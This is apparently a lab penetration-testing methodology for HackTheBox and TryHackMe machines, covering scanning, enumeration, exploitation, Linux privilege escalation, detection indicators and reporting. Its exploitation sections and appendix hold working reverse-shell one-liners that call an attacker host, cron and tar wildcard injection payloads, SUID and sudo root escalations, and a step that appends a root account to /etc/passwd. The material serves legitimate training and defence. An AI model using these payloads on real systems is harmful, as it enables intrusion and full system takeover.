# Security Assessment Methodology

This document defines the structured approach applied to all HackTheBox and TryHackMe machine analyses documented in this repository.

The methodology emphasizes **depth over speed**, **understanding over exploitation**, and **defensive awareness alongside offensive techniques**.

---

## 0. Pre-Engagement

### 0.1 Scope Verification

**Critical checks before starting:**
- [ ] Confirm target IP and machine name
- [ ] **Verify correct VPN connection** (HTB: Labs vs Starting Point, THM: correct region)
- [ ] Document attack box IP for reference (`ip a` on tun0)
- [ ] Set up project directory structure
- [ ] Start timer for personal tracking

### 0.2 Environment Setup

```bash
# Create project structure
mkdir -p ~/htb/<machine-name>/{scans,exploits,loot,notes,screenshots}
cd ~/htb/<machine-name>

# Add virtual host if needed
echo "<target-ip> <machine-name>.htb" | sudo tee -a /etc/hosts

# Initialize notes file
echo "# <Machine-Name> - $(date)" > notes/notes.md
```

**Tools checklist:**
- Terminal multiplexer (tmux/screen) — always run scans in persistent session
- Text editor with syntax highlighting
- Screenshot tool ready
- Burp Suite configured (if web testing expected)

---

## 1. Reconnaissance

### 1.1 Network Scanning

**Objective:** Identify all exposed services and potential attack vectors

**Primary Tool:** `nmap`

#### Phase 1: Quick Port Discovery

Identify open ports rapidly to start enumeration ASAP:

```bash
nmap -p- --min-rate 10000 -oN scans/nmap-allports.txt <target-ip>
```

**Rationale:** Full port scans reveal high-port services that default scans miss. Many boxes hide critical services on non-standard ports.

#### Phase 2: Deep Service Enumeration

Once ports are identified, enumerate services and versions:

```bash
nmap -sC -sV -p <discovered-ports> -oN scans/nmap-services.txt <target-ip>
```

**Flags explained:**
- `-sC` — Run default NSE scripts (safe, informational)
- `-sV` — Version detection
- `-oN` — Save output in readable format

#### Phase 3: UDP Scan (Conditional)

Only if TCP yields limited attack surface:

```bash
sudo nmap -sU --top-ports 100 -oN scans/nmap-udp.txt <target-ip>
```

**Why conditional:** UDP scans are slow; prioritize based on initial findings.

### 1.2 Initial Analysis

Review nmap output carefully:

- **Service versions** — research CVEs immediately
- **OS detection** — influences exploit payload selection
- **HTTP redirects** — virtual host hints (add to `/etc/hosts`)
- **SSL certificates** — may reveal internal domain names, email addresses
- **Banner information** — software versions, internal IPs, misconfigurations

**Document everything** — even "irrelevant" details can become critical later.

---

## 2. Service Enumeration

Each discovered service requires targeted enumeration. **Do not skip this phase.**

### 2.1 Web Services (HTTP/HTTPS)

**Tools:** `gobuster`, `feroxbuster`, `nikto`, manual inspection, Burp Suite

#### Directory & File Discovery

```bash
# Comprehensive directory brute-force
gobuster dir -u http://<target> \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,js,bak,zip,tar,gz \
    -o scans/gobuster-dirs.txt

# CGI-bin specific (if exists) — Shellshock potential
gobuster dir -u http://<target>/cgi-bin/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -x sh,cgi,pl,py \
    -o scans/gobuster-cgi.txt

# Virtual host discovery
gobuster vhost -u http://<target> \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain \
    -o scans/gobuster-vhosts.txt
```

#### Manual Inspection Checklist

- [ ] View page source — look for comments, hidden forms, API endpoints, version info
- [ ] Check `robots.txt`, `sitemap.xml`
- [ ] Test for `.git`, `.svn`, `.env`, `.DS_Store`, backup files (`.bak`, `.old`, `.zip`)
- [ ] Identify web technology stack (Wappalyzer, BuiltWith, or manual header inspection)
- [ ] Test for admin panels, login pages, registration portals
- [ ] Enumerate CMS version (WordPress, Joomla, Drupal, custom)
- [ ] Check for default credentials on discovered admin panels
- [ ] Inspect forms for injection vulnerabilities (SQLi, XSS, command injection)
- [ ] Review cookies — session handling, JWT tokens, serialized objects
- [ ] Test for Local File Inclusion (LFI), Remote File Inclusion (RFI)
- [ ] Enumerate API endpoints if REST/GraphQL detected

#### Common Web Vulnerabilities

| Vulnerability | Testing Method |
|---------------|---------------|
| SQL Injection | `'`, `' OR 1=1--`, sqlmap |
| Command Injection | `; whoami`, `$(whoami)`, `\`whoami\`` |
| LFI | `../../../../etc/passwd`, PHP wrappers |
| XSS | `<script>alert(1)</script>` in inputs |
| IDOR | Modify object IDs in requests |
| File Upload | Upload `.php`, `.phtml`, `.php5`, double extensions |

**Critical:** Always test with different HTTP methods (GET, POST, PUT, DELETE, PATCH).

### 2.2 SMB (445, 139)

**Tools:** `enum4linux`, `smbclient`, `crackmapexec` (nxc), `smbmap`

```bash
# Enumerate shares
smbclient -L //<target> -N
enum4linux -a <target>

# Null session enumeration
crackmapexec smb <target> -u '' -p '' --shares
crackmapexec smb <target> -u 'guest' -p '' --shares

# RID cycling (user enumeration)
crackmapexec smb <target> --rid-brute

# Mount accessible shares
smbclient //<target>/<share> -N
```

**Look for:**
- Anonymous/guest accessible shares
- Writable shares
- Sensitive files (credentials, config files, backups)
- User lists for password spraying

### 2.3 FTP (21)

```bash
# Test anonymous login
ftp <target>
# Username: anonymous
# Password: [blank or email]

# Recursive download if accessible
wget -r ftp://anonymous:anonymous@<target>/
```

**Check for:**
- Anonymous login enabled
- Writable directories (potential web shell upload)
- Accessible files (credentials, source code, backups)

### 2.4 SSH (22)

```bash
# Banner grab
nc <target> 22

# Version-specific CVE research
searchsploit openssh <version>
```

**Notes:**
- SSH is rarely the initial vector on Easy boxes
- Save for credential testing after obtaining usernames/passwords
- Check for SSH key authentication if user enumeration successful

### 2.5 Database Services

#### MySQL (3306)

```bash
# Test for anonymous/root access
mysql -h <target> -u root
mysql -h <target> -u root -p

# Enumerate databases if access obtained
mysql -h <target> -u <user> -p<pass> -e "SHOW DATABASES;"
```

#### MSSQL (1433)

```bash
# Enumerate with impacket
impacket-mssqlclient <user>:<pass>@<target> -windows-auth

# Enable xp_cmdshell if privileged
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**MSSQL-specific:**
- Test for default `sa` account
- Check for impersonation privileges (`SELECT * FROM sys.server_principals WHERE type = 'S'`)
- Look for linked servers (`EXEC sp_linkedservers`)

#### MongoDB (27017)

```bash
# Connect without authentication
mongo <target>

# List databases
show dbs
use <database>
show collections
db.<collection>.find()
```

### 2.6 LDAP (389, 636, 3268, 3269)

**Tools:** `ldapsearch`, `ldapdomaindump`, `bloodhound-python`

```bash
# Anonymous bind test
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"

# Enumerate domain users
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

**Active Directory focus:**
- Extract users, groups, computers
- Identify domain admins, service accounts
- Check for Kerberoastable accounts (SPN set)
- Look for ASREPRoastable users (DONT_REQ_PREAUTH)

### 2.7 Other Services

| Service | Port | Enumeration Tool |
|---------|------|-----------------|
| DNS | 53 | `dig`, `nslookup`, zone transfer attempts |
| SMTP | 25 | `smtp-user-enum`, `nmap --script smtp-enum-users` |
| SNMP | 161 | `snmpwalk`, `onesixtyone`, `snmp-check` |
| NFS | 2049 | `showmount -e`, mount accessible shares |
| RDP | 3389 | `nmap --script rdp-*`, version check |
| WinRM | 5985/5986 | `crackmapexec winrm`, credential testing |
| VNC | 5900+ | `vncviewer`, password brute-force |

---

## 3. Vulnerability Identification

### 3.1 Research Phase

For each discovered service and version:

```bash
# Search for known exploits
searchsploit <service> <version>

# Google research
"<service> <version>" exploit
"<service> <version>" CVE

# Check vulnerability databases
# - ExploitDB
# - NVD (nvd.nist.gov)
# - GitHub (often has PoC code)
# - Packet Storm
```

### 3.2 CVE Analysis

When evaluating a CVE, answer these questions:

- **Does the version match exactly?** (patch levels matter)
- **What are the prerequisites?** (authentication required? specific config?)
- **What is the impact?** (RCE, privilege escalation, info disclosure, DoS)
- **Is there a public PoC?** (proof of concept code available)
- **Has this been patched?** (target version vs patched version)

**Critical:** Read the CVE description and PoC code — don't blindly run exploits.

### 3.3 Custom Application Analysis

For custom web apps or services without known CVEs:

- **Review source code** if accessible (`.git` exposure, file inclusion, source in shares)
- **Analyze application logic** — how does authentication work? authorization? input validation?
- **Test for common flaws** — injection, broken access control, insecure deserialization
- **Fuzz inputs** — unexpected data often reveals vulnerabilities

**Root cause thinking:** Why might this vulnerability exist?
- Developer assumptions about input
- Missing input validation
- Insecure design patterns
- Outdated dependencies

---

## 4. Initial Access

### 4.1 Exploitation Strategy

**Priority order:**
1. **Default credentials** — fastest path if applicable
2. **Unauthenticated RCE** — direct shell access
3. **Authenticated vulnerabilities** — requires initial creds but often reliable
4. **Credential brute-force** — last resort, noisy, time-consuming

### 4.2 Exploit Execution

#### Before running ANY exploit:

- [ ] **Read the exploit code** — understand what it does
- [ ] **Modify for your environment** — IPs, ports, payloads
- [ ] **Test payload syntax** — match target shell capabilities
- [ ] **Set up listener** — `nc -lvnp 4444` before triggering reverse shell
- [ ] **Document the attempt** — what worked, what failed, error messages

#### Common Payload Mistakes

**Shell compatibility:**
```bash
# WRONG (bash-specific, fails in sh)
bash -c 'bash -i >& /dev/tcp/10.10.14.116/4444 0>&1'

# CORRECT (POSIX-compliant, works in sh)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.116",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

**URL encoding for web payloads:**
```bash
# Raw payload (will likely fail)
$(whoami)

# URL-encoded (correct)
%24%28whoami%29
```

### 4.3 Shell Stabilization

Immediately after getting a reverse shell:

```bash
# Spawn interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Set terminal type
export TERM=xterm

# Background shell and fix terminal
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice

# Now you have a fully interactive shell with:
# - Tab completion
# - Arrow keys
# - Ctrl+C doesn't kill shell
# - Text editors work properly
```

---

## 5. Post-Exploitation & Enumeration

### 5.1 Situational Awareness

**First commands:**
```bash
whoami
id
hostname
uname -a
cat /etc/os-release
ip a  # or ifconfig
pwd
```

**Document:**
- Current user and groups
- OS and kernel version
- Network configuration
- Current working directory

### 5.2 User Enumeration

```bash
# List all users
cat /etc/passwd

# Identify real users (UID >= 1000)
cat /etc/passwd | grep -E ':[0-9]{4,}:'

# Home directories
ls -la /home/

# Currently logged in users
w
who
```

**Look for:**
- Other user accounts (lateral movement targets)
- Unusual users (service accounts, admin accounts)
- Home directory contents (SSH keys, bash history, configs)

### 5.3 Privilege & Permission Checks

#### Sudo Rights
```bash
sudo -l
```

**Analyze output:**
- What commands can you run as root?
- Are there argument restrictions?
- Can you set environment variables (`SETENV`)?
- Is `NOPASSWD` set (no password required)?

**GTFOBins:** https://gtfobins.github.io/ — nearly every sudo binary can be abused

#### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

**Focus on:**
- Custom binaries (non-system) — highest exploitation potential
- Unusual system binaries with SUID
- Binaries in user-writable directories

#### Capabilities
```bash
getcap -r / 2>/dev/null
```

**Critical capabilities:**
- `cap_setuid` — can change UID (become root)
- `cap_dac_override` — bypass file permissions
- `cap_sys_admin` — mount filesystems, load kernel modules

### 5.4 Process & Service Enumeration

```bash
# Running processes
ps aux
ps auxf  # tree view

# Services listening on ports
ss -tlnp
netstat -tlnp

# Systemd services
systemctl list-units --type=service --all
```

**Look for:**
- Services running as root
- Internal services (127.0.0.1) — port forwarding candidates
- Unusual processes — custom applications, developer tools
- Process arguments — may contain credentials

**Pro tip:** Use `pspy` to monitor process execution in real-time — catches cron jobs and user activity.

### 5.5 File System Enumeration

#### Configuration Files
```bash
# Web server configs
ls -la /etc/nginx/ /etc/apache2/ /etc/httpd/

# Application configs
ls -la /var/www/ /var/www/html/ /opt/

# Database configs (often contain credentials)
find / -name "*.conf" 2>/dev/null | grep -E "(mysql|postgres|mongo)"
```

#### Credentials & Sensitive Data
```bash
# Search for common password files
find / -name "*.db" -o -name "*.sql" -o -name "*.bak" 2>/dev/null

# Search for SSH keys
find / -name id_rsa -o -name id_ed25519 -o -name id_ecdsa 2>/dev/null

# History files (often contain plaintext credentials)
cat ~/.bash_history ~/.mysql_history ~/.python_history 2>/dev/null

# Environment variables (may contain API keys, passwords)
env
```

#### Writable Directories & Files
```bash
# Find world-writable directories
find / -type d -perm -0002 2>/dev/null | grep -v proc

# Find writable files in /etc
find /etc -writable -type f 2>/dev/null
```

**Critical targets:**
- `/etc/passwd` writable → add root user
- `/etc/sudoers` or `/etc/sudoers.d/*` writable → grant sudo
- Cron job scripts writable → inject commands
- Systemd service files writable → modify ExecStart

### 5.6 Scheduled Tasks

```bash
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron.* /etc/cron.d/

# User crontabs
crontab -l
for user in $(cat /etc/passwd | cut -d: -f1); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done

# Systemd timers
systemctl list-timers --all
```

**Exploitation vectors:**
- Writable cron scripts → inject reverse shell
- PATH hijacking in cron environment
- Wildcard injection (tar, rsync, etc.)

### 5.7 Automated Enumeration

**Tools:**
```bash
# LinPEAS (comprehensive)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum (alternative)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# pspy (process monitoring without root)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

**Warning:** Automated tools are noisy and may trigger defenses. Use selectively.

---

## 6. Privilege Escalation

### 6.1 Common Vectors

#### 6.1.1 Sudo Exploitation

**Example: unrestricted command execution**
```bash
# If sudo -l shows:
# (ALL : ALL) NOPASSWD: /usr/bin/python3

# GTFOBins: sudo python3 -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

**Example: argument manipulation**
```bash
# If sudo -l shows:
# (ALL : ALL) NOPASSWD: /usr/bin/facter

# Read SKILL: facter has --custom-dir flag for loading Ruby files
mkdir ~/.facter/facts.d/
echo 'Facter.add("pwn") { setcode { `chmod +s /bin/bash` }}' > ~/.facter/facts.d/pwn.rb
sudo /usr/bin/facter --custom-dir ~/.facter/facts.d pwn
bash -p
```

**Common sudo bypasses:**
- GTFOBins techniques
- Environment variable manipulation (`SETENV` flag)
- Wildcard injection
- Path hijacking (`NOEXEC` not set)
- LD_PRELOAD/LD_LIBRARY_PATH exploitation

#### 6.1.2 SUID Binary Exploitation

**Example: Custom SUID binary**
```bash
# Find custom SUID binary
find / -perm -4000 2>/dev/null | grep -v -E "(bin|sbin|lib)"

# Analyze with strings, ltrace, strace
strings /usr/local/bin/custom_binary
ltrace /usr/local/bin/custom_binary
strace /usr/local/bin/custom_binary

# Common exploits:
# - Path hijacking (binary calls relative command)
# - Command injection (unsanitized input)
# - Buffer overflow (if compiled code)
# - Symlink abuse
```

**GTFOBins SUID examples:**
```bash
# If 'find' has SUID
/usr/bin/find . -exec /bin/bash -p \; -quit

# If 'vim' has SUID
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'

# If 'python' has SUID
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

#### 6.1.3 Capabilities Exploitation

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# If python3 has cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If tar has cap_dac_override+ep (bypass file permissions):
/usr/bin/tar -cvf root.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf root.tar
```

#### 6.1.4 Writable /etc/passwd

```bash
# If /etc/passwd is writable:
openssl passwd -1 -salt pwned password123
# $1$pwned$<hash>

echo 'pwned:$1$pwned$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
# password: password123
```

#### 6.1.5 Cron Job Exploitation

**Example: Writable cron script**
```bash
# If /etc/cron.d/backup runs /usr/local/bin/backup.sh as root
# And backup.sh is writable:
echo 'bash -i >& /dev/tcp/10.10.14.116/4444 0>&1' >> /usr/local/bin/backup.sh

# Start listener
nc -lvnp 4444

# Wait for cron execution (check /etc/crontab for timing)
```

**PATH hijacking in cron:**
```bash
# If cron script uses relative commands (e.g., 'tar' not '/usr/bin/tar'):
# Create malicious binary in /tmp:
echo '#!/bin/bash
bash -i >& /dev/tcp/10.10.14.116/4444 0>&1' > /tmp/tar
chmod +x /tmp/tar

# Modify PATH in cron environment if possible
# OR rely on default PATH order
```

#### 6.1.6 Kernel Exploits

**Use as last resort** — kernel exploits can crash the machine.

```bash
# Check kernel version
uname -a

# Search for kernel exploits
searchsploit linux kernel <version>

# Compile and execute carefully
gcc exploit.c -o exploit
./exploit
```

**Common Linux kernel exploits:**
- DirtyCow (CVE-2016-5195)
- PwnKit (CVE-2021-4034)
- Dirty Pipe (CVE-2022-0847)

#### 6.1.7 Wildcard Injection

**Example: tar wildcard abuse in cron**
```bash
# If cron runs: tar czf /backup/backup.tar.gz *

# Exploit:
cd /directory/being/backed/up
echo '#!/bin/bash
bash -i >& /dev/tcp/10.10.14.116/4444 0>&1' > shell.sh
chmod +x shell.sh

# Create checkpoint file to execute shell.sh
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'

# Wait for cron job to execute tar with wildcard
```

**Other wildcards:**
- `rsync`, `chown`, `chmod` with `-exec` style flags
- Filename injection (files named like flags)

### 6.2 Windows Privilege Escalation

*(Brief overview — detailed Windows methodology can be expanded if needed)*

**Common vectors:**
- Unquoted service paths
- Weak service permissions (sc.exe, accesschk)
- AlwaysInstallElevated registry key
- Stored credentials (cmdkey, credential manager)
- Token impersonation (Juicy Potato, PrintSpoofer)
- Scheduled tasks with writable paths
- DLL hijacking

**Tools:**
- WinPEAS
- PowerUp.ps1
- PrivescCheck.ps1
- Seatbelt

---

## 7. Post-Root Actions

### 7.1 Flag Collection

```bash
# Standard flag locations
cat /home/*/user.txt
cat /root/root.txt

# Alternative locations (some boxes)
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null
```

### 7.2 Cleanup (if required by box)

- Remove uploaded tools
- Delete created users
- Restore modified files
- Clear bash history (ethical practice in real engagements)

### 7.3 Screenshot Evidence

- Capture `whoami` output showing root
- Capture flag file contents
- Capture `/etc/passwd` showing user (if created)

---

## 8. Defensive Considerations

### 8.1 Indicators of Compromise

For each exploit used, document:

**Network indicators:**
- Inbound connections to common ports (4444, 1234, 9001)
- Outbound connections from server
- Port scans (nmap signatures in IDS/IPS)

**System indicators:**
- New user accounts in `/etc/passwd`
- SUID bit changes on system binaries
- Modified cron jobs or systemd services
- New processes spawned by web server user
- Unusual bash history entries

**Log artifacts:**
- Web server access logs (sqlmap user-agents, directory brute-force)
- Authentication logs (SSH attempts, sudo usage)
- Application logs (SQL errors, file inclusion attempts)
- System logs (privilege escalation events)

### 8.2 Detection Opportunities

How would a defender detect this attack?

- **File integrity monitoring** — SUID changes, /etc/passwd modifications
- **Process monitoring** — unusual parent-child relationships, root processes from web user
- **Network monitoring** — reverse shells, unusual outbound connections
- **Log correlation** — failed auth → successful auth → sudo usage → new user creation
- **Anomaly detection** — sudden increase in HTTP requests, SQL error messages

### 8.3 Hardening Recommendations

For each vulnerability, provide specific hardening guidance:

| Priority | Recommendation | Rationale |
|----------|---------------|-----------|
| Immediate | Change default credentials | Prevents immediate compromise |
| Immediate | Patch known CVEs | Closes exploitable vulnerabilities |
| Short-term | Implement input validation | Prevents injection attacks |
| Short-term | Apply least privilege | Limits blast radius |
| Long-term | Regular security audits | Proactive vulnerability detection |

---

## 9. Documentation & Reporting

### 9.1 Report Structure

Every completed box should include:

1. **Executive Summary** — high-level overview for non-technical audience
2. **Attack Chain** — visual flow diagram or bullet-point chain
3. **Detailed Technical Walkthrough** — reproducible steps with commands
4. **Findings Table** — vulnerabilities with severity ratings
5. **Defensive Considerations** — IOCs, detection, hardening
6. **Lessons Learned** — personal insights and methodology improvements

### 9.2 Severity Ratings

Use consistent severity scale:

- 🔴 **Critical** — Unauthenticated RCE, complete system compromise, domain admin
- 🟠 **High** — Authenticated RCE, local privilege escalation to root, credential exposure
- 🟡 **Medium** — Information disclosure, authenticated vulnerabilities, weak configurations
- 🔵 **Low** — Minor info leaks, version disclosure, non-exploitable issues
- ⚪ **Info** — Best practice violations, recommendations

### 9.3 Sanitization

**Always redact:**
- Flag values
- Real attack box IPs (replace with 10.10.14.116 or <attack-ip>)
- Real target IPs (replace with <target-ip> or use box name)
- Actual passwords (mark as [REDACTED] or use placeholders)

**Why:** Public writeups should not enable cheating or bypassing lab requirements.

---

## 10. Lessons Learned & Continuous Improvement

After each box, document:

### 10.1 Technical Insights

- New tools or techniques learned
- Unexpected behavior or edge cases
- Command syntax that worked vs. failed
- Time wasted on rabbit holes (and why)

### 10.2 Methodology Refinements

- What would you do differently next time?
- Which enumeration step was critical?
- What assumption led you astray?
- How could documentation be improved?

### 10.3 Personal Tracking

- Time to user flag
- Time to root flag
- Number of hints used
- Rabbit holes explored
- Tools that didn't work (and why)

**Goal:** Each box should make you a better penetration tester than the last.

---

*End of Methodology*

---

## Appendix: Quick Reference Commands

### Port Scanning
```bash
nmap -p- --min-rate 10000 <target>
nmap -sC -sV -p <ports> <target>
```

### Web Enumeration
```bash
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### Reverse Shells
```bash
# Bash (if bash available)
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# Python (POSIX-safe)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

# Netcat (if available)
nc <attacker-ip> 4444 -e /bin/bash

# PHP
php -r '$sock=fsockopen("<attacker-ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Shell Stabilization
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

### Privilege Escalation Checks
```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*
```

### File Transfers
```bash
# On attacker machine
python3 -m http.server 8000

# On target
wget http://<attacker-ip>:8000/file
curl http://<attacker-ip>:8000/file -o file
```
